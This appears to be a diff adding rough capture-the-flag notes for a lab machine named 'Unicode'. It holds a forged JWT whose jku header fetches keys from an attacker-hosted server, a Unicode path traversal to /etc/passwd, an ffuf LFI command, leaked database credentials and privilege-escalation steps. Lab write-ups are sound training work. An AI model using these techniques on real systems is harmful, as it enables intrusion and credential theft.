@@ -1,1 +1,22 @@
 # Unicode
+
+Core Concepts:
+
+## Enumeration
+
+As is tradition we start with an nmap scan
+
+```
+nmap -sC -sV 10.10.11.126 -o nmap.unicode.txt
+
+gobuster
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE2LjM6ODAwMC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.Ve02m8ej8v2G2YGGXrY_bvQYKWGSjI_kMbIhOuRDLKjBFnFWBvxTZhZuFLdoa_NVQMZ2-MNR8STR3AVxUfN6Ah1sl54yEcdP0i5aOvLr3bvAoZDwdlGtWwThnlX2-gFXbm2AFQZrafy42sianD0GWKclbaBYX1gKSy9XtGiFpcfJRg64DO_mji1JMzM0UBHCxoN01M2L0MCsYEtgv7yWDuCAcdfEmmqp7cNtZBiefjfzN2SYx-c6HpFYDx99sox8TCdqGwn3Lc3Wyz94TxLsqAtjyQM5qATX7rNSPPd9_F4zpiGIiPADy5q6zF3FYdPPbVRuP9mpov5nO7paxJd5Aw
+
+ / / / /etc/passwd
+
+ffuf -u 'http://hackmedia.htb/display/?page= / / / FUZZ' -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE2LjM6ODAwMC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.Ve02m8ej8v2G2YGGXrY_bvQYKWGSjI_kMbIhOuRDLKjBFnFWBvxTZhZuFLdoa_NVQMZ2-MNR8STR3AVxUfN6Ah1sl54yEcdP0i5aOvLr3bvAoZDwdlGtWwThnlX2-gFXbm2AFQZrafy42sianD0GWKclbaBYX1gKSy9XtGiFpcfJRg64DO_mji1JMzM0UBHCxoN01M2L0MCsYEtgv7yWDuCAcdfEmmqp7cNtZBiefjfzN2SYx-c6HpFYDx99sox8TCdqGwn3Lc3Wyz94TxLsqAtjyQM5qATX7rNSPPd9_F4zpiGIiPADy5q6zF3FYdPPbVRuP9mpov5nO7paxJd5Aw' -mc 200 -w LFI-LFISuite-pathtotest.txt -fw 1299
+
+mysql_host: "localhost" mysql_user: "code" mysql_password: "B3stC0d3r2021@@!" mysql_db: "user"
+
+sudo -l 
